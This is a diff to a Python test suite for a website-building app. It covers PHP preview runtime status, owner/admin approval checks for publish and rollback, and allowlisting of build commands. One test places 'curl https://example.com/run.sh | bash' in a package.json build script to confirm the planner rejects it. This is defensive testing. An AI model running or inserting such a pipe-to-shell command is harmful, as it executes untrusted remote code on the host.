@@ -24,6 +24,7 @@ sys.path.insert(0, str(APP_ROOT / "backend"))
 
 from backend.service import app_events_for_action, handle_action, resolve_secret_resource
 from backend.store import _git_import_source_ref, _github_error_detail, _redact_secret_text, _site_mutation_lock
+from preview_runtime import build_plan_for_source, prepare_runtime_build, runtime_capability_status
 from safety import MAX_SOURCE_TREE_FILES, validate_source_tree_for_phase1
 
 
@@ -84,6 +85,15 @@ def _edit_index(data_root: Path, site_id: str, marker: str = "Edited") -> None:
     )
     if status != 200:
         raise AssertionError(write_payload)
+
+
+def _approval_actor(user_id: str = "user:owner", workspace_role: str = "owner") -> dict[str, object]:
+    return {
+        "user_id": user_id,
+        "workspace_role": workspace_role,
+        "platform_role": "",
+        "effective_mode": "sandbox",
+    }
 
 
 class WebsiteStudioEntrypointTest(unittest.TestCase):
@@ -1207,18 +1217,19 @@ class WebsiteStudioEntrypointTest(unittest.TestCase):
             profile = imported["import"]["source_profile"]
             self.assertEqual(profile["preview_runtime_kind"], "php")
             self.assertEqual(profile["php_docroot"], "frontend-website")
-            self.assertIn("platform PHP preview runtime", profile["missing_requirements"][0])
+            self.assertEqual(profile["missing_requirements"], [])
+            self.assertTrue(profile["runtime_preview_supported"])
 
             status, preview = handle_action(data_root, {"action": "build_preview", "site_id": imported["site"]["id"]})
             self.assertEqual(status, 200)
             self.assertEqual(preview["runtime_kind"], "php")
-            self.assertEqual(preview["runtime_status"], "static_fallback")
-            self.assertIn("platform PHP preview runtime", preview["missing_requirements"][0])
-            self.assertIn("sanitized static HTML fallback", " ".join(preview["warnings"]))
+            self.assertEqual(preview["runtime_status"], "blocked")
+            self.assertIn("php executable", preview["missing_requirements"][0])
+            self.assertIn("Preview runtime unavailable", preview["html"])
 
             with sqlite3.connect(data_root / "app.sqlite") as db:
                 row = db.execute("SELECT status, route FROM previews WHERE id = ?", (preview["preview_id"],)).fetchone()
-            self.assertEqual(row, ("static_fallback", preview["route"]))
+            self.assertEqual(row, ("blocked", preview["route"]))
 
     def test_php_site_without_static_html_returns_runtime_diagnostic_preview(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
@@ -1234,7 +1245,8 @@ class WebsiteStudioEntrypointTest(unittest.TestCase):
             profile = imported["import"]["source_profile"]
             self.assertFalse(profile["static_preview_supported"])
             self.assertEqual(profile["preview_runtime_kind"], "php")
-            self.assertIn("platform PHP preview runtime", profile["missing_requirements"][0])
+            self.assertEqual(profile["missing_requirements"], [])
+            self.assertTrue(profile["runtime_preview_supported"])
 
             status, preview = handle_action(data_root, {"action": "build_preview", "site_id": imported["site"]["id"]})
             self.assertEqual(status, 200)
@@ -1243,13 +1255,13 @@ class WebsiteStudioEntrypointTest(unittest.TestCase):
             self.assertEqual(preview["page_id"], "")
             self.assertTrue(preview["preview_url"].startswith("/apps/website-studio/preview-runtime/?"))
             self.assertIn("Preview runtime unavailable", preview["html"])
-            self.assertIn("platform PHP preview runtime", preview["missing_requirements"][0])
+            self.assertIn("php executable", preview["missing_requirements"][0])
 
             status, document = handle_action(data_root, {"action": "preview_document", "preview_id": preview["preview_id"]})
             self.assertEqual(status, 200)
             self.assertEqual(document["preview"]["status"], "blocked")
             self.assertIn("Preview runtime unavailable", document["html"])
-            self.assertIn("platform PHP preview runtime", document["html"])
+            self.assertIn("php executable", document["html"])
 
             with sqlite3.connect(data_root / "app.sqlite") as db:
                 preview_row = db.execute("SELECT status, page_id FROM previews WHERE id = ?", (preview["preview_id"],)).fetchone()
@@ -1427,6 +1439,8 @@ class WebsiteStudioEntrypointTest(unittest.TestCase):
         self.assertIn("PreviewStatus", app_source)
         self.assertIn("runtime_status", app_source)
         self.assertIn("missing_requirements", app_source)
+        self.assertIn("active_view: activeView", app_source)
+        self.assertIn("context_tool: 'website_page_context'", app_source)
         self.assertIn("previewState?.preview_url || ''", app_source)
         self.assertIn("sandbox=\"allow-scripts allow-same-origin\"", app_source)
         self.assertIn("src={previewUrl}", app_source)
@@ -1495,6 +1509,10 @@ class WebsiteStudioEntrypointTest(unittest.TestCase):
         self.assertIn("overflow: hidden", styles)
         self.assertIn("Drop ZIP", app_source)
         self.assertIn("Connect Git", app_source)
+        self.assertIn("upload_file", app_source)
+        self.assertIn("commit", app_source)
+        self.assertIn("material-symbols-rounded", sitemap_widget)
+        self.assertIn("material-symbols-rounded", footer_widget)
         for forbidden in {"Commit", "Push", "Deploy", "Publish", "Rollback"}:
             self.assertNotIn(f">{forbidden}<", app_source)
         self.assertLess(sitemap_widget.index('class="search"'), sitemap_widget.index('class="site-select-frame"'))
@@ -1529,7 +1547,8 @@ class WebsiteStudioEntrypointTest(unittest.TestCase):
                     "site_id": site_id,
                     "approval_action": "publish",
                     "target_id": request_id,
-                    "approved_by": "owner@example.com",
+                    "approved_by": "user:owner",
+                    "_app_actor": _approval_actor(),
                     "confirm": True,
                 },
             )
@@ -1562,7 +1581,8 @@ class WebsiteStudioEntrypointTest(unittest.TestCase):
                     "site_id": site_id,
                     "approval_action": "rollback",
                     "target_id": initial_revision_id,
-                    "approved_by": "owner@example.com",
+                    "approved_by": "user:owner",
+                    "_app_actor": _approval_actor(),
                     "confirm": True,
                 },
             )
@@ -1609,12 +1629,42 @@ class WebsiteStudioEntrypointTest(unittest.TestCase):
                     "site_id": site_id,
                     "approval_action": "publish",
                     "target_id": request_payload["publish_request"]["id"],
-                    "approved_by": "owner@example.com",
+                    "approved_by": "user:owner",
+                    "_app_actor": _approval_actor(),
                     "confirm": False,
                 },
             )
             self.assertEqual(status, 400)
             self.assertIn("confirm=true", blocked["detail"])
+
+            status, unauthenticated = handle_action(
+                data_root,
+                {
+                    "action": "approval_record",
+                    "site_id": site_id,
+                    "approval_action": "publish",
+                    "target_id": request_payload["publish_request"]["id"],
+                    "approved_by": "user:owner",
+                    "confirm": True,
+                },
+            )
+            self.assertEqual(status, 400)
+            self.assertIn("authenticated Maverick user actor", unauthenticated["detail"])
+
+            status, unauthorized = handle_action(
+                data_root,
+                {
+                    "action": "approval_record",
+                    "site_id": site_id,
+                    "approval_action": "publish",
+                    "target_id": request_payload["publish_request"]["id"],
+                    "approved_by": "user:member",
+                    "confirm": True,
+                    "_app_actor": _approval_actor(user_id="user:member", workspace_role="member"),
+                },
+            )
+            self.assertEqual(status, 400)
+            self.assertIn("owner/admin", unauthorized["detail"])
 
     def test_phase3_managed_static_publish_target_creates_artifact_record(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
@@ -1637,7 +1687,8 @@ class WebsiteStudioEntrypointTest(unittest.TestCase):
                     "site_id": site_id,
                     "approval_action": "publish",
                     "target_id": request_payload["publish_request"]["id"],
-                    "approved_by": "owner@example.com",
+                    "approved_by": "user:owner",
+                    "_app_actor": _approval_actor(),
                     "confirm": True,
                 },
             )
@@ -1753,7 +1804,8 @@ class WebsiteStudioEntrypointTest(unittest.TestCase):
                     "site_id": site_id,
                     "approval_action": "publish",
                     "target_id": request_id,
-                    "approved_by": "owner@example.com",
+                    "approved_by": "user:owner",
+                    "_app_actor": _approval_actor(),
                     "confirm": True,
                 },
             )
@@ -1911,7 +1963,8 @@ class WebsiteStudioEntrypointTest(unittest.TestCase):
                     "site_id": site_id,
                     "approval_action": "publish",
                     "target_id": request_id,
-                    "approved_by": "owner@example.com",
+                    "approved_by": "user:owner",
+                    "_app_actor": _approval_actor(),
                     "confirm": True,
                 },
             )
@@ -1967,7 +2020,8 @@ class WebsiteStudioEntrypointTest(unittest.TestCase):
                     "site_id": site_id,
                     "approval_action": "publish",
                     "target_id": request_id,
-                    "approved_by": "owner@example.com",
+                    "approved_by": "user:owner",
+                    "_app_actor": _approval_actor(),
                     "confirm": True,
                 },
             )
@@ -2007,7 +2061,79 @@ class WebsiteStudioEntrypointTest(unittest.TestCase):
         self.assertNotIn("ghp_errorSecret", detail)
         self.assertNotIn("github_pat_errorSecret", detail)
 
-    def test_phase2_build_validation_records_static_policy(self) -> None:
+    def test_phase3a_build_plan_expands_giuntitrail_allowlisted_scripts(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            source_root = Path(tmp)
+            (source_root / "package-lock.json").write_text("{}", encoding="utf-8")
+            (source_root / "package.json").write_text(
+                json.dumps(
+                    {
+                        "scripts": {
+                            "build": "npm run build:css && npm run build:js",
+                            "build:css": "npm run css:compile && npm run css:prefix && npm run css:minify",
+                            "build:js": "webpack --mode production --config webpack.config.js",
+                            "css:compile": "node-sass frontend-website/src/css/main.scss frontend-website/dist/css/style.css --output-style expanded",
+                            "css:prefix": "postcss frontend-website/dist/css/style.css --use autoprefixer -o frontend-website/dist/css/style.prefixed.css",
+                            "css:minify": "cssnano frontend-website/dist/css/style.prefixed.css frontend-website/dist/css/style.min.css && rm frontend-website/dist/css/style.prefixed.css",
+                        }
+                    }
+                ),
+                encoding="utf-8",
+            )
+
+            plan = build_plan_for_source(source_root)
+
+            self.assertFalse(plan.missing_requirements)
+            self.assertEqual([command[0] for command in plan.commands], ["node-sass", "postcss", "cssnano", "rm", "webpack"])
+
+    def test_phase3a_build_plan_rejects_unallowlisted_shell_commands(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            source_root = Path(tmp)
+            (source_root / "package-lock.json").write_text("{}", encoding="utf-8")
+            (source_root / "package.json").write_text('{"scripts":{"build":"curl https://example.com/run.sh | bash"}}', encoding="utf-8")
+
+            plan = build_plan_for_source(source_root)
+
+            self.assertFalse(plan.commands)
+            self.assertIn("not allowlisted", " ".join(plan.missing_requirements))
+
+    def test_phase3a_runtime_capability_reports_missing_php_binary(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            source_root = Path(tmp)
+            (source_root / "package-lock.json").write_text("{}", encoding="utf-8")
+            (source_root / "package.json").write_text('{"scripts":{"build":"vite build"}}', encoding="utf-8")
+
+            with patch("preview_runtime.shutil.which", return_value=None):
+                capability = runtime_capability_status(
+                    source_root,
+                    {"preview_runtime_kind": "php", "has_package_manifest": True, "missing_requirements": []},
+                )
+
+            self.assertEqual(capability["runtime_status"], "blocked")
+            self.assertIn("php executable", " ".join(capability["missing_requirements"]))
+
+    def test_phase3a_php_runtime_without_package_manifest_does_not_require_node_build(self) -> None:
+        with tempfile.TemporaryDirectory() as tmp:
+            data_root = Path(tmp) / "data"
+            source_root = Path(tmp) / "source"
+            source_root.mkdir()
+            (source_root / "index.php").write_text("<?php echo 'Home';", encoding="utf-8")
+
+            with patch("preview_runtime.shutil.which", return_value="/usr/bin/php"):
+                result = prepare_runtime_build(
+                    data_root,
+                    "site_test",
+                    source_root,
+                    build_id="build_test",
+                    source_profile={"preview_runtime_kind": "php", "has_package_manifest": False, "php_docroot": "."},
+                )
+
+            self.assertEqual(result["status"], "passed")
+            self.assertEqual(result["missing_requirements"], [])
+            self.assertNotIn("package.json", result["logs_summary"])
+            self.assertTrue((data_root / "sites" / "site_test" / "builds" / "build_test" / "runtime" / "index.php").exists())
+
+    def test_phase3a_node_build_without_lockfile_is_blocked_before_execution(self) -> None:
         with tempfile.TemporaryDirectory() as tmp:
             data_root = Path(tmp)
             archive = BytesIO()
@@ -2020,14 +2146,10 @@ class WebsiteStudioEntrypointTest(unittest.TestCase):
 
             status, build_payload = handle_action(data_root, {"action": "build_validate", "site_id": imported["site"]["id"]})
             self.assertEqual(status, 201)
-            self.assertEqual(build_payload["build"]["status"], "passed")
-            self.assertIn("not executed", " ".join(build_payload["build"]["warnings"]))
+            self.assertEqual(build_payload["build"]["status"], "blocked")
             self.assertEqual(build_payload["build"]["runtime_kind"], "node_build")
-            artifact_ref = build_payload["build"]["artifact_ref"]
-            self.assertEqual(artifact_ref["kind"], "static_preview_artifact")
-            artifact_index = data_root / artifact_ref["artifact_root"] / "index.html"
-            self.assertTrue(artifact_index.exists())
-            self.assertIn("Build", artifact_index.read_text(encoding="utf-8"))
+            self.assertIn("package-lock.json", " ".join(build_payload["build"]["missing_requirements"]))
+            self.assertEqual(build_payload["build"]["artifact_ref"], {})
 
 
 if __name__ == "__main__":
